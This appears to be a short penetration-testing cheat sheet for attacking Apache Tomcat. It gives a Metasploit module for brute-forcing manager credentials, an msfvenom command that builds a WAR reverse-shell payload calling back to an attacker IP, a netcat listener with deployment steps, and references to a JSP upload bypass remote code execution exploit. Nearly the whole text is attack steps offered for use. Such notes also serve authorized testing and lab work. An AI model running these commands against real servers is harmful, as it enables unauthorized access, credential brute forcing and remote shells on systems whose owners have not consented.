# Apache Tomcat

For /manager, we need credentials.

For automatic brute force

```
msf5 > use auxiliary/scanner/http/tomcat_mgr_login
```

### WAR File Backdoor

When we got the credentials for manager, we can get shell.

```
$ msfvenom -p java/shell_reverse_tcp lhost=192.168.1.1 lport=80 -f war -o pwn.war
```

Browse -> Deploy

nc -nvlp 80

http://192.168.1.2:8080/pwn/

### Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution

[https://www.exploit-db.com/exploits/42966\
https://www.exploit-db.com/exploits/42953](https://www.exploit-db.com/exploits/42966https://www.exploit-db.com/exploits/42953)

msf6 exploit(multi/http/tomcat\_jsp\_upload\_bypass)
